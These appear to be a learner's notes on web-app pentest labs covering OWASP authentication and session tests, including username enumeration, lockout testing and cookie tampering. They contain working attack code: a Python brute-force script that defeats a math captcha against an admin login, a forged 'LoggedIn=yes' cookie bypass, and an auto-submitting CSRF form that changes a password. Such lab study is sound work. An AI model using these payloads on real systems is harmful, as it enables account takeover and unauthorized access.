![[Pasted image 20260513234059.png]]
![[Pasted image 20260513234154.png]]

## Username Enumeration
- Find out existing users in the application through different error responses in authentication mechanisms
- Commonly found on 'Forgot Password' pages
- Use Burp Intruder to Brute Force enumeration

## Test for weak password policy (WSTG-ATHN -07)
- Dictionary or Brute Force attack
- Focus Areas
	- Password complexity
	- Account Lockouts
	- Error messages

## Test for weak lockout mechanisms
### Brute-forcing mathematical Captcha using Python

```python
import re
import requests

session = requests.Session()

regex = '<h4 style="text-align: center;margin-top: 4px"> (.*?) = </h4>'

with open('passwords.txt', 'r') as f:
    for password in f:
        password = password.rstrip()

        response = session.get('http://192.197.53.3')
        output = re.search(regex, response.text)

        cookies = session.cookies.get_dict()
        captcha = eval(output.group(1))

        print("Trying Password: " + password)

        data = {
            "username": "admin",
            "password": password,
            "captcha": captcha
        }

        output = session.post(
            'http://192.197.53.3/login',
            cookies=cookies,
            data=data
        )

        # ✅ THIS MUST BE INSIDE THE LOOP
        if "Error" not in output.text:
            print("Password Found: " + password)
            break
```

## Account Lockout Bypass

>[!Important]
>```dirb``` - directory buster
```searchsploit``` - search for exploits
> Look in the source code for service versions and search for exploits
## Bypassing Authentication Schema (WSTG-ATHN-04)

- Airline Booking Sample website - Added ``` Cookie: LoggedIn=yes  ``` to log into admin without password

## Session Management Testing
![[Pasted image 20260519220720.png]]

## Testing Session Management Schema (WSTG-SESS-01)
![[Pasted image 20260519223139.png]]
![[Pasted image 20260519223247.png]]

![[Pasted image 20260519223326.png]]
![[Pasted image 20260519223348.png]]

- Decode intercepted cookies and modify them. 

## CSRF

```html
<html>
 <head>
 </head>
 <body>
 <!-- php ticket -->
 <form
action="http://erwb8pwcy6r2s2k63q756yur3.ap-south-16.attackdefensecloudlabs.com/?p=process_change_password&id=1"
method="POST" id="csrf" name="csrf" onload="go()">
 <input type="hidden" name="new_password" value="test"/>
 <input type="hidden" name="confirm_password" value="test"/>
 <input type="hidden" name="submit" value="Change Password"/>
 <input type="submit" value="Submit form" />
 </form>
 </form>
 <script language="JavaScript" type="text/javascript">
 document.csrf.submit();
 </script>
 </body>
 </html>
```

